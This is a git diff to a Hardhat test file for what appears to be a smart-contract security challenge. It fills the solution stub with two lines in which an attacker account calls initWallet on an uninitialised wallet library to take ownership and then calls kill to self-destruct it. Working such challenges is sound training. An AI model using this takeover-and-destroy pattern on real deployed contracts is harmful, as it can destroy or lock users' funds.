@@ -1,3 +1,4 @@
+import { messagePrefix } from "@ethersproject/hash";
 import { expect } from "chai";
 import { Contract, Signer, BigNumber } from "ethers";
 import { ethers } from "hardhat";
@@ -52,8 +53,10 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
-
   // implement solution here
+  
+  await safuWalletLibrary.connect(attacker).initWallet([], 0, ethers.constants.MaxUint256)
+  await safuWalletLibrary.connect(attacker).kill(await attacker.getAddress())
 
 });
 
